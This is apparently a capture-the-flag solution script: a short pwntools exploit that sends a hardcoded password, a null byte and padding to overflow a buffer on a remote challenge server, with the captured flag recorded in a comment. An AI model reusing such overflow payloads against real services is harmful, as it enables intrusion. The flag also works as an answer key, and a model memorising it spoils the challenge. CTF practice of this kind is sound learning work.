from pwn import *
elf = context.binary = ELF("./chall")
# r = process()
r = remote("ctf-chall.stembascc.com",5203)
rop = ROP(context.binary)
PASSWORD = b"SMKN7Semarang"
offset = 84 - len(PASSWORD)
rop.raw(PASSWORD)
rop.raw(b"\x00")
rop.raw(b"a" * offset)
r.sendline(rop.chain())
print(r.recvall())

# flag --> STEMBACTF{L3arning_B0F_Is_N0t_D1ff1cult_Ri9ht??}